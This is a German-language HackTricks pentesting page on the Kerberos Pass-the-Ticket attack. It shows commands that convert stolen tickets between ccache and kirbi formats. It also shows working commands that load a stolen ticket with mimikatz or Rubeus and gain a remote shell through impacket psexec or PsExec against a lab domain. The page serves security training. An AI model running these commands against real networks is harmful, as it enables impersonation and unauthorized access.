# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## Pass The Ticket (PTT)

Im **Pass The Ticket (PTT)** Angriffsverfahren stehlen Angreifer **das Authentifizierungsticket eines Benutzers** anstelle seines Passworts oder Hash-Werte. Dieses gestohlene Ticket wird dann verwendet, um **den Benutzer zu impersonieren** und unbefugten Zugriff auf Ressourcen und Dienste innerhalb eines Netzwerks zu erhalten.

**Lesen**:

- [Harvesting tickets from Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Harvesting tickets from Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

### **Swaping Linux and Windows tickets between platforms**

Das [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) Tool konvertiert Ticketformate nur mit dem Ticket selbst und einer Ausgabedatei.
```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache => kirbi

python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi => ccache
```
In Windows kann [Kekeo](https://github.com/gentilkiwi/kekeo) verwendet werden.

### Pass The Ticket Angriff
```bash:Linux
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

```bash:Windows
#Load the ticket in memory using mimikatz or Rubeus
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
klist #List tickets in cache to cehck that mimikatz has loaded the ticket
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```
## Referenzen

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)

{{#include ../../banners/hacktricks-training.md}}
